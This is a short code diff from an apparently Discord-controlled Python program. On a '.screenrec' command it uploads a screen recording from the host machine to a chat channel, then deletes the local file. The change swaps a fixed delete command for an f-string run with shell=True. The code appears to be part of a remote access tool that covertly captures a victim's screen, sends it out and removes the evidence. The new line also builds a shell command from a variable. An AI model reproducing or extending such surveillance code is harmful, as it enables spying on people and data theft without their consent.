@@ -30,7 +30,7 @@ elif message.content == '.screenrec':
 
         reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
         await reaction_msg.add_reaction('📌')
-        subprocess.run('del recording.mp4', shell=True)
+        subprocess.run(f'del {output_file}', shell=True)
 
     except Exception as e:
         await message.channel.send("An error occurred during screen recording.")
